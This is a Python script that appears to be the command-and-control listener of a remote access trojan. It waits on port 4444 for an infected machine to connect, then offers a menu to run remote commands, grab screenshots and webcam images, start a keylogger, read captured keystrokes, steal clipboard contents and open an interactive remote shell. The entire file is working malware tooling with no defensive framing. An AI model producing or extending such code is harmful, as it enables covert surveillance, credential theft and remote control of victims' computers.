import socket

def start_listener(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(1)
    print(f"[*] Listening on {ip}:{port}")

    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    while True:
        print("\n[1] Run Commands\n[2] Capture Screenshot\n[3] Capture Webcam\n[4] Start Keylogger\n[5] View Keylog File\n[6] Clipboard Hijacking\n[7] Open Shell\n[8] Exit")
        choice = input("Select Option: ")

        if choice == "1":
            cmd = input("Shell> ")
            client.send(cmd.encode())
            output = client.recv(4096).decode()
            print(output)
        elif choice == "2":
            client.send(b"screenshot")
            print("[+] Screenshot Command Sent!")
        elif choice == "3":
            client.send(b"webcam")
            print("[+] Webcam Capture Command Sent!")
        elif choice == "4":
            client.send(b"keylog")
            print("[+] Keylogger Started!")
        elif choice == "5":
            print("\n[+] Keylog File Contents:")
            with open("keylog.txt", "r") as file:
                print(file.read())
        elif choice == "6":
            client.send(b"clipboard")
            clipboard_data = client.recv(4096).decode()
            print("\n[+] Clipboard Data:\n" + clipboard_data)
        elif choice == "7":
            client.send(b"shell")
            print("[+] Entering Shell Mode (Type 'exit_shell' to return)")
            while True:
                cmd = input("Shell> ")
                client.send(cmd.encode())
                if cmd.lower() == "exit_shell":
                    break
                output = client.recv(4096).decode()
                print(output)
        elif choice == "8":
            client.send(b"exit")
            break

    client.close()
    server.close()

if __name__ == "__main__":
    start_listener("0.0.0.0", 4444)  # Change IP if needed
